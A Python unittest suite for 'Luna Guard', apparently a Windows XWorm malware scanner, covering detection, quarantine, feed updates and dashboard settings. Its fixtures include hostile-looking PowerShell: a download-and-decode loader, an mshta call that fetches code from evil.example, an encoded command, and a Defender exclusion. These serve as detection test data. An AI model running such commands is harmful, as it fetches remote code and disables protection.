"""24 test cases ของ Luna Guard  (รัน: python -m unittest -v test_luna)
ส่วนที่เป็นคำสั่ง Windows (netstat/schtasks/ipconfig/registry) จำลองผลลัพธ์ด้วย mock - ไฟล์/แฮช/YARA/กักกัน/ฐานข้อมูลทดสอบจริง"""
import argparse, contextlib, hashlib, io, json, os, sys, tempfile, unittest
from pathlib import Path
from unittest import mock

ROOT = Path(tempfile.mkdtemp(prefix="lg_"))
os.environ.update(LOCALAPPDATA=str(ROOT / "local"), APPDATA=str(ROOT / "AppData"), TEMP=str(ROOT / "AppData/Temp"),
                  WINDIR=str(ROOT / "Windows"), PROGRAMDATA=str(ROOT / "PD"), ABUSECH_KEY="test-key")
sys.path.insert(0, str(Path(__file__).resolve().parent))
import luna_guard as lg
import luna_dashboard as dashboard
import luna_app as app

XW = b"MZ" + b"\0" * 60 + b"mscoree.dll BSJB " + "<Xwormmm>".encode("utf-16le") + b"\0" * 20
TMP = ROOT / "AppData/Temp"; TMP.mkdir(parents=True)
CMDS, OUT = [], {"netstat": "", "sch": "", "dns": "", "procs": "[]"}


class FakeReg:
    HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_SET_VALUE = "HKCU", "HKLM", 2
    data = {("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"): {}}
    class K:
        def __init__(s, d): s.d = d
        def __enter__(s): return s
        def __exit__(s, *a): pass
    @classmethod
    def OpenKey(c, h, sub, r=0, a=0):
        if (h, sub) not in c.data: raise OSError
        return c.K(c.data[(h, sub)])
    @staticmethod
    def EnumValue(k, i):
        it = list(k.d.items())
        if i >= len(it): raise OSError
        return it[i][0], it[i][1], 1
    @staticmethod
    def DeleteValue(k, n): del k.d[n]


def fake_run(cmd):
    CMDS.append(cmd); c = cmd[0].lower()
    return {"netstat": OUT["netstat"], "ipconfig": OUT["dns"], "powershell": OUT["procs"]}.get(c, OUT["sch"] if c == "schtasks" and cmd[1] == "/query" else "")


lg.run, lg.winreg = fake_run, FakeReg
RUNKEY = ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")


def scan(clean=False, paths=None):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        lg.cmd_scan(argparse.Namespace(clean=clean, full=False, paths=paths or [str(TMP)]))
    return buf.getvalue(), lg.LAST_SCAN


def sev(res, kind): return [f["sev"] for f in res["findings"] if f["kind"] == kind]


class T(unittest.TestCase):
    def setUp(self):
        for f in TMP.glob("*"): f.unlink()
        (Path(os.environ["APPDATA"]) / r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt").unlink(missing_ok=True)
        case_dir = ROOT / self._testMethodName; case_dir.mkdir(exist_ok=True)
        lg.APP_DIR = case_dir; lg.DB_PATH = case_dir / "threats.db"
        lg.QUAR_DIR = case_dir / "quarantine"; lg.QUAR_INDEX = lg.QUAR_DIR / "index.json"
        lg.CONFIG = case_dir / "config.json"; lg.HISTORY = case_dir / "history.json"
        dashboard.LANGUAGE_FILE = case_dir / "settings.json"
        lg.LAST_SCAN.clear()
        CMDS.clear(); FakeReg.data[RUNKEY].clear(); OUT.update(netstat="", sch="", dns="", procs="[]")

    def test01_hash_match(self):
        f = TMP / "a.exe"; f.write_bytes(b"MZ" + b"Z" * 300)
        con = lg.db()
        con.execute("INSERT OR REPLACE INTO hashes VALUES(?,?,?)", (hashlib.sha256(f.read_bytes()).hexdigest(), "XWorm", "test"))
        con.commit(); con.close()
        _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["high"])

    def test02_yara_xworm_sample(self):
        (TMP / "b.exe").write_bytes(XW); out, r = scan()
        self.assertEqual(sev(r, "ไฟล์"), ["high"]); self.assertIn("YARA: LunaGuard_XWorm_Strong", out)

    def test03_no_false_positive(self):
        (TMP / "ok.exe").write_bytes(b"MZ" + b"A" * 500); (TMP / "n.txt").write_text("xworm article")
        (TMP / "dotnet.exe").write_bytes(b"MZ" + b"\0" * 20 + b"mscoree.dll BSJB" + b"x" * 200)
        _, r = scan(); self.assertEqual(r["findings"], [])

    def test04_system_name_mimic(self):
        (TMP / "csrss.exe").write_bytes(XW); _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["high"])

    def test05_powershell_loader_is_medium_not_cleaned(self):
        f = TMP / "l.ps1"; f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, r = scan(clean=True); self.assertEqual(sev(r, "ไฟล์"), ["medium"]); self.assertTrue(f.exists())

    def test06_powershell_history(self):
        h = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; h.parent.mkdir(parents=True, exist_ok=True)
        h.write_text("dir\nmshta https://evil.example/c\npowershell -enc " + "QQ" * 20 + "\nAdd-MpPreference -ExclusionPath C:\\\n")
        _, r = scan(); self.assertEqual(len(sev(r, "PowerShell")), 3)

    def test07_c2_connection(self):
        con = lg.db(); con.execute("INSERT OR REPLACE INTO iocs VALUES('45.67.89.10','ip','XWorm','test')"); con.commit(); con.close()
        OUT["netstat"] = "  TCP    10.0.0.5:50123    45.67.89.10:7000    ESTABLISHED    4321\n  TCP    10.0.0.5:50124    8.8.8.8:443    ESTABLISHED    999\n"
        _, r = scan(); self.assertEqual(sev(r, "เครือข่าย"), ["high"])

    def test08_scam_domain_dns(self):
        OUT["dns"] = "Record Name . . . : beastxm.com\nRecord Name . . . : www.google.com\n"
        _, r = scan(); self.assertEqual(sev(r, "DNS/hosts"), ["medium"])
        self.assertIn("beastxm.com", r["findings"][0]["target"])

    def test09_update_from_abuse_ch(self):
        def fake_http(url, data=None, headers=None, timeout=0):
            self.assertEqual((headers or {}).get("Auth-Key"), "test-key")
            if "mb-api" in url: return json.dumps({"query_status": "ok", "data": [{"sha256_hash": "AB" * 32}]}).encode()
            if "threatfox" in url:
                self.assertEqual(json.loads(data)["query"], "get_iocs")
                return json.dumps({"query_status": "ok", "data": [
                    {"ioc": "1.2.3.4:7000", "ioc_type": "ip:port",
                     "malware_samples": [{"sha256_hash": "CD" * 32}]},
                    {"ioc": "http://c2.example/x", "ioc_type": "url", "malware": "win.other"},
                ]}).encode()
            return b"# c\n127.0.0.1\tbad.example\n"
        old, lg.http = lg.http, fake_http
        with contextlib.redirect_stdout(io.StringIO()): lg.cmd_update()
        lg.http = old; con = lg.db()
        self.assertEqual(con.execute("SELECT COUNT(*) FROM hashes WHERE sha256=?", ("ab" * 32,)).fetchone()[0], 1)
        self.assertEqual(con.execute("SELECT COUNT(*) FROM hashes WHERE sha256=?", ("cd" * 32,)).fetchone()[0], 1)
        for v in ("1.2.3.4", "c2.example", "bad.example"): self.assertEqual(con.execute("SELECT COUNT(*) FROM iocs WHERE value=?", (v,)).fetchone()[0], 1)
        con.close()

    def test10_end_to_end_clean_and_restore(self):
        f = TMP / "csrss.exe"; f.write_bytes(XW); p = str(f)
        FakeReg.data[RUNKEY]["Updater"] = f'"{p}" /s'
        OUT["sch"] = '"HOST","\\\\SvcUpdate","N/A","Ready","x","N/A","0","N/A","N/A","' + p + '","x"\n'
        OUT["procs"] = json.dumps([{"ProcessId": 4321, "Name": "csrss.exe", "ExecutablePath": p}])
        _, r = scan(clean=True)
        self.assertFalse(f.exists()); self.assertEqual(FakeReg.data[RUNKEY], {})
        self.assertIn(["taskkill", "/F", "/PID", "4321"], CMDS); self.assertTrue(any(c[:2] == ["schtasks", "/delete"] for c in CMDS))
        qid = next(iter(lg.load_index())); _, r2 = scan(); self.assertEqual([x for x in r2["findings"] if x["sev"] == "high"], [])
        with contextlib.redirect_stdout(io.StringIO()):
            lg.cmd_restore(argparse.Namespace(id=qid))
        self.assertTrue(f.exists())

    def test11_medium_asks_user_then_quarantine(self):
        f = TMP / "l.ps1"; f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        scan(clean=True); self.assertTrue(f.exists())            # --clean ไม่แตะ MEDIUM
        with contextlib.redirect_stdout(io.StringIO()):
            qid = lg.remove_finding(str(f))                      # ผู้ใช้กด "กักกัน" เอง
            self.assertFalse(f.exists()); lg.cmd_restore(argparse.Namespace(id=qid))
        self.assertTrue(f.exists())

    def test12_allowlist_and_path_safety(self):
        f = TMP / "l2.ps1"; f.write_bytes(b'#2 x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, r = scan(); self.assertEqual(sev(r, "ไฟล์"), ["medium"])
        with contextlib.redirect_stdout(io.StringIO()): lg.allow_file(str(f))     # ผู้ใช้กด "ปลอดภัย"
        _, r = scan(); self.assertEqual(r["findings"], [])
        with self.assertRaises(SystemExit): lg.remove_finding("/etc/passwd")      # ลบไฟล์นอกผลสแกนไม่ได้

    def test13_low_severity(self):
        f = TMP / "h.ps1"; f.write_bytes(b"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1")
        _, r = scan(clean=True); self.assertEqual(sev(r, "ไฟล์"), ["low"]); self.assertTrue(f.exists())

    def test14_progress_log_and_skip_filters(self):
        (TMP / "Cache").mkdir(exist_ok=True); (TMP / "Cache/x.exe").write_bytes(XW)   # โฟลเดอร์แคช ข้าม
        (TMP / "data.bin").write_bytes(b"not a program " * 50)                          # ไม่ใช่ MZ ข้าม
        out, r = scan(); self.assertEqual(r["findings"], []); self.assertEqual(lg.PROGRESS, {})
        for t in ("▶ [1/1] เริ่ม:", "✔ จบ:", "รวมตรวจ 1 ไฟล์", "[5/5]"): self.assertIn(t, out)
        (TMP / "Cache/x.exe").unlink(); (TMP / "Cache").rmdir()

    def test15_stop_button(self):
        for n in "abc": (TMP / f"{n}.exe").write_bytes(b"MZ" + n.encode() * 200)
        real = lg.analyze
        def stopper(path, con): lg.STOP["flag"] = True; return real(path, con)
        lg.analyze = stopper
        try: out, _ = scan()
        finally: lg.analyze = real
        self.assertIn("หยุดสแกนไฟล์", out); self.assertIn("รวมตรวจ 1 ไฟล์", out)

    def test16_scan_history_persists_details_and_last_result(self):
        f = TMP / "loader.ps1"
        f.write_bytes(b'x.DownloadString("http://a");[Convert]::FromBase64String($a);-WindowStyle Hidden')
        _, result = scan()
        saved = json.loads(lg.HISTORY.read_text())[-1]
        self.assertEqual(saved["time"], result["time"])
        self.assertTrue(os.path.samefile(saved["findings"][0]["target"], str(f)))
        self.assertEqual(saved["medium"], 1)
        lg.LAST_SCAN.clear()
        self.assertEqual(dashboard.state()["last"]["time"], saved["time"])
        self.assertEqual(dashboard.state()["last"]["findings"], saved["findings"])

    def test17_threatfox_dict_data_is_normalized(self):
        def fake_http(url, data=None, headers=None, timeout=0):
            if "mb-api" in url:
                return json.dumps({"query_status": "no_results", "data": []}).encode()
            if "threatfox" in url:
                return json.dumps({"query_status": "ok", "data": {
                    "item": {"ioc": "c2.example", "ioc_type": "domain", "malware_printable": "XWorm"}
                }}).encode()
            return b""
        old, lg.http = lg.http, fake_http
        try:
            out = io.StringIO()
            with contextlib.redirect_stdout(out): lg.cmd_update()
        finally:
            lg.http = old
        con = lg.db()
        self.assertEqual(con.execute("SELECT family FROM iocs WHERE value='c2.example'").fetchone()[0], "XWorm")
        self.assertNotIn("string indices must be integers", out.getvalue())
        self.assertEqual(lg.norm_ioc("a" * 64, "sha256_hash"), ("", ""))
        con.close()

    def test18_update_retries_gateway_error(self):
        import urllib.error
        calls = []
        old = lg.http
        def flaky(*args, **kwargs):
            calls.append(1)
            if len(calls) == 1:
                error = urllib.error.HTTPError(args[0], 502, "Bad Gateway", {}, io.BytesIO())
                error.close()
                raise error
            return b"ok"
        lg.http = flaky
        try:
            self.assertEqual(lg.update_http("https://feed.example"), b"ok")
        finally:
            lg.http = old
        self.assertEqual(len(calls), 2)

    def test19_failed_update_does_not_advance_timestamp(self):
        con = lg.db()
        con.execute("INSERT OR REPLACE INTO meta VALUES('last_update','old-time')")
        con.commit(); con.close()
        old = lg.http
        def offline(*args, **kwargs): raise OSError("offline")
        lg.http = offline
        try:
            out = io.StringIO()
            with contextlib.redirect_stdout(out): lg.cmd_update()
        finally:
            lg.http = old
        con = lg.db()
        self.assertEqual(con.execute("SELECT v FROM meta WHERE k='last_update'").fetchone()[0], "old-time")
        self.assertIn("ทุกแหล่งข้อมูลล้มเหลว", out.getvalue())
        con.close()

    def test20_missing_webview_does_not_launch_browser_or_server(self):
        with mock.patch.object(app, "load_webview", return_value=None), \
                mock.patch.object(app, "show_dependency_error") as show_error, \
                mock.patch.object(app, "serve") as serve:
            self.assertEqual(app.main(), 1)
        show_error.assert_called_once_with()
        serve.assert_not_called()

    def test21_language_setting_persists_and_preserves_other_settings(self):
        dashboard.set_language("en")
        self.assertEqual(dashboard.get_language(), "en")
        dashboard.LANGUAGE_FILE.write_text(json.dumps({"theme": "dark"}), encoding="utf-8")
        dashboard.set_language("zh-CN")
        self.assertEqual(json.loads(dashboard.LANGUAGE_FILE.read_text(encoding="utf-8")),
                         {"theme": "dark", "language": "zh-CN"})

    def test22_unsupported_language_is_rejected(self):
        for language in ("fr", None, []):
            with self.subTest(language=language), self.assertRaises(ValueError):
                dashboard.set_language(language)

    def test23_locale_bundles_have_matching_keys(self):
        locales = json.loads((Path(__file__).resolve().parent / "locales.json").read_text(encoding="utf-8"))
        self.assertEqual(set(locales), {"th", "en", "zh-CN"})
        expected = set(locales["th"])
        self.assertTrue(all(set(translations) == expected for translations in locales.values()))

    def test24_corrupt_language_settings_can_be_replaced(self):
        dashboard.LANGUAGE_FILE.write_text("{invalid json", encoding="utf-8")
        dashboard.set_language("en")
        self.assertEqual(dashboard.get_language(), "en")


if __name__ == "__main__":
    unittest.main(verbosity=2)
